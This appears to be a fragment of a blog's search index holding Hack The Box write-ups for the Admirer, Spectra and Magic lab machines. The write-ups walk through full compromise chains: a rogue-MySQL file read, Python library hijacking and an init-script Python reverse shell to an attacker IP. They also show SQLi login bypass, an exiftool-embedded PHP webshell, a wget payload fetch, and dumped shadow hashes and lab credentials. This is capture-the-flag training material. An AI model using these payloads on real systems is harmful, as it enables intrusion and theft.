╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝"
  },
  {
    "objectID": "posts/2020-05-15-htb-writeup-admirer/2020-05-15-htb-writeup-admirer.html",
    "href": "posts/2020-05-15-htb-writeup-admirer/2020-05-15-htb-writeup-admirer.html",
    "title": "Admirer - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:~# nmap -Pn -sC -sV -n admirer.htb PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.187/index.php (CODE:200|SIZE:6051)\nhttp://10.10.10.187/robots.txt (CODE:200|SIZE:138)\n\nNIKTO:\n\n“robots.txt” contains 1 entry which should be manually viewed.\n\nrobots.txt contains “Disallow: /admin-dir”. Fuzzing the directory we find nothing, however adding searching for .txt-files we do find contacts.txt and credentials.txt.\nroot@nidus:/opt# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt\n /'___\\  /'___\\           /'___\\\n/\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n\\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n  \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n   \\/_/    \\/_/   \\/___/    \\/_/\n\nv1.1.0-git\n\n:: Method : GET :: URL : http://10.10.10.187/admin-dir/FUZZ.txt :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________\ncontacts [Status: 200, Size: 350, Words: 19, Lines: 30] credentials [Status: 200, Size: 136, Words: 5, Lines: 12]\nCurl the pages:\nroot@nidus:~# curl http://admirer.htb/admin-dir/contacts.txt ########## # admins # ########## # Penny Email: p.wise@admirer.htb\n############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb\n# Amy Email: a.bialik@admirer.htb\n# Leonard Email: l.galecki@admirer.htb\n############# # designers # ############# # Howard Email: h.helberg@admirer.htb\n# Bernadette Email: b.rauch@admirer.htb\nroot@nidus:~# curl http://admirer.htb/admin-dir/credentials.txt [Internal mail account] w.cooper@admirer.htb fgJr6q#S:$P\n[FTP account] ftpuser %n?4Wz}R$tTF7\n[Wordpress account] admin w0rdpr3ss01!\nUsing the FTP credentials we can extract to files, html.tar.gz and dump.sql. Extracting we find even more useful info:\nroot@nidus:/opt/htb/machines/admirer/ftp/html# cat index.php .. $username = “waldo”; $password = “]F7jLHw:*G&gt;UPrTo}~A”d6b”; $dbname = “admirerdb”;\nroot@nidus:/opt/htb/machines/admirer/ftp/html/utility-scripts# cat db_admin.php .. $servername = “localhost”; $username = “waldo”; $password = “Wh3r3_1s_w4ld0?”;\nroot@nidus:/opt/htb/machines/admirer/ftp# cat dump.sql – MySQL dump 10.16 Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)\n\nTrying to brute force SSH with found credentials gives nothing. Continue to enumerate.\n\nFuzzing the utility-scripts directory we find a login page, adminer.php.\nroot@nidus:/opt# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/utility-scripts/FUZZ.php\n     /'___\\  /'___\\           /'___\\\n    /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n    \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n     \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n      \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n       \\/_/    \\/_/   \\/___/    \\/_/\n\n    v1.1.0-git\n ________________________________________________\n\n  :: Method           : GET\n  :: URL              : http://10.10.10.187/utility-scripts/FUZZ.php\n  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt\n  :: Follow redirects : false\n  :: Calibration      : false\n  :: Timeout          : 10\n  :: Threads          : 40\n  :: Matcher          : Response status: 200,204,301,302,307,401,403\n ________________________________________________\n\n .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]\n .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]\n adminer                 [Status: 200, Size: 4156, Words: 189, Lines: 52]\n info                    [Status: 200, Size: 83813, Words: 4024, Lines: 962]\n phptest                 [Status: 200, Size: 32, Words: 8, Lines: 1]\nAdminer is a database front-end, and the current running version is 4.6.2. We are unable to login with found credentials. Googling about that version we find that it has a vulnerability that allows us to get the server to connect back to us, and extract local credentials.\nStart by setting up our local SQL Server.\nroot@nidus:/opt# vi /etc/mysql/mariadb.conf.d/50-server.cnf .. #port = 3306 .. #bind-address = 127.0.0.1\nroot@nidus:/opt# service mysql restart root@nidus:/opt# mysql -u root MariaDB [(none)]&gt; CREATE USER ‘p3’@admirer.htb IDENTIFIED BY ‘test123’; MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON . TO ‘p3’@admirer.htb IDENTIFIED BY ‘test123’; MariaDB [(none)]&gt; FLUSH PRIVILEGES; MariaDB [(none)]&gt; create database giveUser;\nDouble check that your service is up and running. root@nidus:/opt# nmap 10.10.14.5 -p 3306 PORT STATE SERVICE 3306/tcp open mysql\nConnect back to your local server from the login promt. System: MySQL Server: 10.10.14.5 Username: p3 Password: test123 Database: giveUser\nOnce logged in in the top left corner press ‘SQL Command’ and use local file read exploit to find the new and updated creds in index.php.\nload data local infile ‘/var/www/html/index.php’ into table giveUser.ext fields terminated by “”\n\nPress ‘select’ next to the table ext and scroll down to find new creds. .. edit $servername = “localhost”; edit $username = “waldo”; edit $password = “&&lt;h5b~yK3F#{PaPB&dA}{H&gt;”; edit $dbname = “admirerdb”;\n\nSSH with new found credentials and grab user.txt waldo@admirer:~$ cat user.txt 07ef49887c197759a2815e192ff97638\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nsudo -l tells us that we can change the environment variables (setenv) and run /opt/scripts/admin_tasks.sh as root. In the directory /opt/scripts we find 2 scripts ‘admin_tasks.sh’ and ‘backup.py’. The backup-script calls for function ‘make_archive’ in module ‘shutil’, which is triggered from admin_tasks.sh ‘Backup Web Data’-function (option 6).\nwaldo@admirer:/tmp/p3$ sudo -l .. User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh\nwaldo@admirer:/opt/scripts$ cat admin_tasks.sh #!/bin/bash .. backup_web() { if [ “$EUID” -eq 0 ] then echo “Running backup script in the background, it might take a while…” /opt/scripts/backup.py & else echo “Insufficient privileges to perform the selected operation.” fi }\nwaldo@admirer:/opt/scripts$ cat backup.py #!/usr/bin/python3\nfrom shutil import make_archive\nsrc = ‘/var/www/html/’\n# old ftp directory, not used anymore #dst = ‘/srv/ftp/html’\ndst = ‘/var/backups/html’\nmake_archive(dst, ‘gztar’, src)\nBy default, python will ALLWAYS execute external modules first from winthin the directory of the script (/opt/scripts) and then follow PYTHONPATH. Unfortunatley we are not allowed to write files into /opt/scripts, so next we check if we can hijack the module in any of the PATH-directories.\nLocate shutil.py: waldo@admirer:/opt/scripts$ find / -name shutil.py 2&gt;&1 | grep -v “Permission denied” /usr/lib/python3.5/shutil.py /usr/lib/python2.7/shutil.py\nCheck PYTHONPATH: waldo@admirer:/opt/scripts$ python3 -c ‘import sys; print (sys.path)’ [’‘,’/usr/lib/python35.zip’, ‘/usr/lib/python3.5’, ‘/usr/lib/python3.5/plat-x86_64-linux-gnu’, ‘/usr/lib/python3.5/lib-dynload’, ‘/usr/local/lib/python3.5/dist-packages’, ‘/usr/lib/python3/dist-packages’]\nLooking in the box we can confirm that neither is /usr/lib writeable. We are unable to hijack the module by inserting a malicious script before the original.\n\nHowever, looking at the output from ‘sudo -l’ we are allowed to “SETENV”, meaning we can change and honor PATH’s.\n\nCreate a malicious file you’d like the script to trigger. Start by a simple one and then move on to a more complex to grant a shell.\nWrite to a file: waldo@admirer:/dev/shm$ cat shutil.py import os os.system(“echo ‘test’ &gt;&gt; /dev/shm/test.txt”)\nRun the script with your environment PATH (where your malicious script is). waldo@admirer:/opt/scripts$ sudo PYTHONPATH=“/dev/shm” ./admin_tasks.sh .. Choose an option: 6 Running backup script in the background, it might take a while…\n\nwaldo@admirer:/dev/shm$ ls -al total 8 drwxrwxrwt 2 root root 100 May 15 12:11 . drwxr-xr-x 17 root root 560 May 15 12:11 .. -rw-r–r– 1 waldo waldo 671 May 15 12:11 shutil.py -rw-r–r– 1 root root 5 May 15 12:06 test.txt -rw-r–r– 1 root root 0 May 15 10:21 .tmpfs\ntest.txt was created by root. We can now make it more complex and insert our public key into root’s authorized_keys.\nwaldo@admirer:/dev/shm$ cat shutil.py import os def make_archive(a,b,c): os.system(“mkdir /root/.ssh;echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvjlE9AC+5OMV006RAncmH9w/Jr0DYYdxnneDLtTof+DV1qghPPhkjDYyD4Noj3O9W/aD6ZziBa2O9ONnCNBFPTBULr+Uyy2bBLY4xLDb3meIQdplTHGBUus75JZY4MDBRQD5fLPV4xsw/DNAiXGO1DjG3fk6iTV5GgTrhhmH79Lr2XCTWU2Z48EJrIFVJiM+UAyl3qg+nRQ7btAypgzsGyI9MC2zsAnr77Q8lqM0VGkH97PLGo7ljvD4Fy96U8PaIT/sle0Nai/muH8+NetD1RQK5caBJf3zYTs6L1NEacF5c7N9xCDwMsC0ot5z0EIe3jF0So+a8ulCgjgEXl1wVyCaciyqyFzSfVdGeh4m7evluYUAhxQOJR4XoK385+b5G9bYoXOuGhkCPI8s+nHIgjVFU+g5P/vgpt0VEZKVfIG/2J7Ykk9jniBIyZEzVpUPyuOEHexgILs7l7c5uNUQaKalJAA4GK7X+Dyd9WWrLvuIJIwf55Z47uItIJVS7aT8= root@nidus’ &gt;&gt; /root/.ssh/authorized_keys”)\n\nLogin as root and grab root.txt\nroot@nidus:/opt/htb/machines/admirer# ssh root@admirer.htb -i root-id_rsa root@admirer:~# cat root.txt 57abe1909d2a490f3aa0daa4c8c0833d\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nAdminer Vuln https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool\nMariaDB https://mariadb.com/kb/en/configuring-mariadb-for-remote-client-access/ https://mariadb.com/kb/en/select-into-outfile/\nPython Shutil https://vuldb.com/?id.124167 https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1000802\nPython sys.path https://askubuntu.com/questions/470982/how-to-add-a-python-module-to-syspath\nPython Session Hijacking https://rastating.github.io/privilege-escalation-via-python-library-hijacking/ https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7"
  },
  {
    "objectID": "posts/2021-03-02-htb-writeup-spectra/2021-03-02-htb-writeup-spectra.html",
    "href": "posts/2021-03-02-htb-writeup-spectra/2021-03-02-htb-writeup-spectra.html",
    "title": "Spectra - Hack The Box",
    "section": "",
    "text": "██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/spectra]# nmap -Pn -n -sCV –open 10.10.10.229 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn’t have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n\nDIRB: —- Entering directory: http://10.10.10.229/main/ —- + http://10.10.10.229/main/index.php (CODE:301|SIZE:0) ==&gt; DIRECTORY: http://10.10.10.229/main/wp-admin/ ==&gt; DIRECTORY: http://10.10.10.229/main/wp-content/ ==&gt; DIRECTORY: http://10.10.10.229/main/wp-includes/ + http://10.10.10.229/main/xmlrpc.php (CODE:405|SIZE:42)\n—- Entering directory: http://10.10.10.229/main/wp-content/ —- + http://10.10.10.229/main/wp-content/index.php (CODE:200|SIZE:0) ==&gt; DIRECTORY: http://10.10.10.229/main/wp-content/languages/ ==&gt; DIRECTORY: http://10.10.10.229/main/wp-content/plugins/ ==&gt; DIRECTORY: http://10.10.10.229/main/wp-content/themes/ ==&gt; DIRECTORY: http://10.10.10.229/main/wp-content/upgrade/ ==&gt; DIRECTORY: http://10.10.10.229/main/wp-content/uploads/\n—- Entering directory: http://10.10.10.229/testing/ —- + http://10.10.10.229/testing/index.php (CODE:500|SIZE:2646)\nNIKTO: + Server: nginx/1.17.4 + Retrieved x-powered-by header: PHP/5.6.40\nWPSCAN: + WordPress version 5.4.2 + Theme twentynineteen + Theme twentyseventeen + Theme twentytwenty\n\nVisiting http://10.10.10.229 we find; “Until IT set up the Jira we can configure and use this for issue tracking.”, and two links to ‘Software Issue Tracker’ (spectra.htb/main/index.php) and ‘Test’ (spectra.htb/testing/index.php).\n\nTEST: + Database connection error + All files are listed when visiting http://spectra.htb/testing/, we find + http://spectra.htb/testing/wp-config.php.save shows it’s configuration when inspecting the source code + DB_NAME: dev + DB_USER: devtest + DB_PASSWORD: devteam01 + DB_HOST: localhost + table_prefix: wp_\nFinding the MySQL creds we can try to dump the database; [root:/git/htb/spectra]# mysqldump -h 10.10.10.229 dev wp_users -u devtest -p Enter password: devteam01 mysqldump: Got error: 1130: “Host ‘10.10.14.12’ is not allowed to connect to this MySQL server” when trying to connect\nMAIN: + The main page have WordPress printed all over it + The welcome message is made by user Administrator + Admin login at http://10.10.10.229/main/wp-admin/\nUse the found password to login on wp-admin (administrator:devteam01). Once logged in upload a php reverse shell as a plugin, note that we will get a error saying: “The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10)”. However, the file will still be uploaded and reachable through ‘http://10.10.10.229/main/wp-content/uploads///rev.php’\nSetup a local listener and visit ‘http://10.10.10.229/main/wp-content/uploads/2021/05/rev.php’\n[root:/git/htb/spectra]# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.229] 41986 Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux 00:23:28 up 50 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY LOGIN@ IDLE JCPU PCPU WHAT uid=20155(nginx) gid=20156(nginx) groups=20156(nginx) $ pwd / $ ls -al /home total 32 drwxr-xr-x 8 root root 4096 Feb 2 15:55 . drwxr-xr-x 22 root root 4096 Feb 2 14:52 .. drwx—— 4 root root 4096 Jul 20 2020 .shadow drwxr-xr-x 20 chronos chronos 4096 May 10 23:35 chronos drwxr-xr-x 4 katie katie 4096 Feb 10 00:38 katie drwxr-xr-x 5 nginx nginx 4096 Feb 4 12:41 nginx drwxr-x–t 4 root root 4096 Jul 20 2020 root drwxr-xr-x 4 root root 4096 Jul 20 2020 user\n\nWhen first getting access to wp-admin we did it through one of the wp-config-files, however we could not reach the other one. Maybe there’s another set of creds there. To find the location of the web directory we can search for ‘wordpress’ using find.\n\nnginx@spectra / $ find . -name wordpress 2&gt; &gt;(grep -v ‘Permission denied’ &gt;&2) ./usr/local/share/nginx/html/main/wp-includes/js/tinymce/plugins/wordpress\nnginx@spectra /usr/local/share/nginx/html/testing $ cat wp-config.php define( ‘DB_NAME’, ‘dev’ ); define( ‘DB_USER’, ‘devtest’ ); define( ‘DB_PASSWORD’, ‘devteam01’ );\nSame creds unfortunately. But how about the main page’s wp-config.php?\nnginx@spectra /usr/local/share/nginx/html/main $ cat wp-config.php define( ‘DB_NAME’, ‘dev’ ); define( ‘DB_USER’, ‘dev’ ); define( ‘DB_PASSWORD’, ‘development01’ ); $table_prefix = ‘wp_’;\nThe password is not reused for any of the user accounts, so seems like this is a dead end as well. Check if there are any other services running locally on the system.\nnginx@spectra /dev/shm $ chmod +x linpeas.sh nginx@spectra /dev/shm $ ./linpeas.sh bash: ./linpeas.sh: Permission denied\nnginx@spectra /tmp $ bash linpeas.sh [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN -\nFrom linpeas we find nothing really useful, only that there are some service running on port 9000 locally that we can’t reach. This next step took me a few hours, but then finally I found;\nnginx@spectra /opt $ cat autologin.conf.orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description “Automatic login at boot” author “chromium-os-dev@chromium.org” # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script passwd= # Read password from file. The file may optionally end with a newline. for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e “\\({dir}/passwd\" ]; then\n          passwd=\"\\)(cat”\\({dir}/passwd\")\"\n          break\n        fi\n      done\n      if [ -z \"\\){passwd}” ]; then exit 0 fi # Inject keys into the login prompt. # # For this to work, you must have already created an account on the device. # Otherwise, no login prompt appears at boot and the injected keys do the # wrong thing. /usr/local/sbin/inject-keys.py -s “${passwd}” -k enter\nAnalysing the script we see that ‘Read password from file’ /etc/autologin/passwd. nginx@spectra /opt $ cat /etc/autologin/passwd SummerHereWeCome!!\n\nTry the password on our different users (katie:SummerHereWeCome!! is correct) and grab user.txt.\n\n[root:/git/htb/spectra]# ssh katie@spectra.htb Password: SummerHereWeCome!! katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) katie@spectra ~ $ cat user.txt e89d27fe195e9114ffa72ba8913a6130\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs usual, we try ‘sudo -l’ to see if we can grab a easy root.\n\nkatie@spectra ~ $ sudo -l User katie may run the following commands on spectra: (ALL) SETENV: NOPASSWD: /sbin/initctl\ninitctl handles all startup scripts, which are stored in /etc/init/. We don’t have any write access to the folder, however there are 10 test.conf-file that we have write permissions over.\nkatie@spectra /etc/init $ ls -al -rw-rw—- 1 root developers 478 Jun 29 2020 test.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test1.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test10.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test2.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test3.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test4.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test5.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test6.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test7.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test8.conf -rw-rw—- 1 root developers 478 Jun 29 2020 test9.conf\nCreate a malicious script that will start a new shell: katie@spectra ~ $ cat pwn.c int main() { setgid(0); setuid(0); system(“/bin/bash”); }\nNote that the privs are nothing special: katie@spectra ~ $ ls -al -rw-r–r– 1 katie katie 73 May 11 02:57 pwn.c\nEdit one of the /etc/init/conf-scripts to setuid and chown the malicious script as root: katie@spectra /etc/init $ cat test.conf description “Setuid pwn.c PrivEsc” author “PlayerThree”\nstart on filesystem or runlevel [2345]\nstop on shutdown\n\nscript\n\n  chown root:root /home/katie/pwn.c\n  chmod 4755 /home/katie/pwn.c\n\nend script\nRun the script: katie@spectra ~ $ sudo /sbin/initctl start test test start/running, process 40624\nNote how the privs have changed, we should now be able to trigger a root shell: katie@spectra ~ $ ls -al -rwsr-xr-x 1 root root 114 May 11 03:32 pwn.c\nkatie@spectra ~ $ ./pwn.c -bash: ./pwn.c: Permission denied\nkatie@spectra ~ $ bash pwn.c pwn.c: warning: pwn.c: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md pwn.c: line 4: syntax error near unexpected token ('     pwn.c: line 4:int main()’\n\nBecause of noexec we can trigger the script using normal ‘./’, and it seems like the c-syntax isn’t working. Instead we can try to directly throw different reverse one-liners into the startup script /etc/init/test.conf.\n\nkatie@spectra ~ $ cat /etc/init/test.conf description “Root Reverse PrivEsc” author “PlayerThree”\nstart on filesystem or runlevel [2345]\nstop on shutdown\n\nscript\n\n    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\nend script\nkatie@spectra ~ $ sudo /sbin/initctl start test test start/running, process 41762\n[root:/git/htb/spectra]# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.229] 42060 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt d44519713b889d5e1f9e536d0c6df2fc\n# cat /etc/shadow\n  root:$1$lchcuPsn$BgyskySIi0hFMF4/v7S53.:18661::::::\n  chronos:*:::::::\n  nginx:!:18660:0:99999:7:::\n  katie:$1$IL2kvPV1$mYHaoPio5/jIZ.JL/RLr2/:18662:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nStartup script exploit, /etc/init: https://recipeforroot.com/exploiting-startup-scripts/ https://www.doyler.net/security-not-included/exploiting-init-d-fun-profit"
  },
  {
    "objectID": "posts/2020-05-17-htb-writeup-magic/2020-05-17-htb-writeup-magic.html",
    "href": "posts/2020-05-17-htb-writeup-magic/2020-05-17-htb-writeup-magic.html",
    "title": "Magic - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:~# nmap -Pn -sC -sV -n 10.10.10.185 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.185/index.php (CODE:200|SIZE:4052)\nhttp://10.10.10.185/server-status (CODE:403|SIZE:277)\n\nNIKTO:\n\nIP address found in the ‘location’ header. The IP is “127.0.1.1”.\nCookie PHPSESSID created without the httponly flag\nDEBUG HTTP verb may show server debugging information.\n/login.php: Admin login page/section found.\n\nLooking on the webpage we find a few images, however nothing interesting. On login.php we are prompted with username/password. There’s nothing obvious, no usernames, no passwords. Looking for ways to bypass the login, first thing we should try is SQLi.\nUsername: admin’# Password: \nAllows us to bypass the login. We are now prompted with a upload feature.\nThe upload only allows us to upload images. Trying to upload a script or .php-file and changing the mime type through burp is not possible. Instead we can create a malicious .jpg-file with embedded code to give us code execution.\nroot@nidus:~/Pictures# exiftool -DocumentName=“\n\nPlayer Three Has Entered The Game ';\\$cmd = (\\$_REQUEST['cmd']);system(\\$cmd);echo '';} __halt_compiler();?&gt;\n\n” skull.jpg 1 image files updated\nroot@nidus:~/Pictures# mv skull.jpg skull.php.jpg\nUpload the picture and we can now browse to it: http://magic.htb/images/uploads/skull.php.jpg Enumerate the box through the URL by executing the embedded code: http://magic.htb/images/uploads/skull.php.jpg?cmd=whoami www-data\nTo get a more stable shell we can upload a reverse php-shell through the webshell.\nStart a listener: root@nidus:~/Pictures# nc -lvnp 4488 listening on [any] 4488 …\nSetup your HTTP-server: root@nidus:/srv/pub-share# python3 -m http.server 8081 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) …\nDownload the reverse-shell: http://magic.htb/images/uploads/skull.php.jpg?cmd=wget%2010.10.14.11:8081/rev.php\nExecute the reverse shell and gain a connection: http://magic.htb/images/uploads/rev.php\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.10.185] 45530 Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 12:05:55 up 2:41, 0 users, load average: 0.00, 0.00, 0.00 USER TTY 